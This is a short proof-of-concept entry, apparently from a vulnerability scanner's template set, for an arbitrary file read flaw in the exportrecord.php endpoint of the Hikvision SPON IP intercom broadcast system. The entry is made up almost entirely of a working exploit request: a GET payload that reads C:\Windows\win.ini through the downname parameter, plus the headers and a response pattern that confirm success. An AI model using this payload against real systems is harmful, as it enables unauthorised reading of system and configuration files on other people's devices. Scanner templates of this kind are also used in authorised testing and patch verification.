{
        'name': '海康威视SPON IP网络对讲广播系统exportrecord存在任意文件读取',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/php/exportrecord.php?downtype=10&downname=C:\\Windows\\win.ini',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Upgrade-Insecure-Requests': '1'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'for'
        }}]
    }